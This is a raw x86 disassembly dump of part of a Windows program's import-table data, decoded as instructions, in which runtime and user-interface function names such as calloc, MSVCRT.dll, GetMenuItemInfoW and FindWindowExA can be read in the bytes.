  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
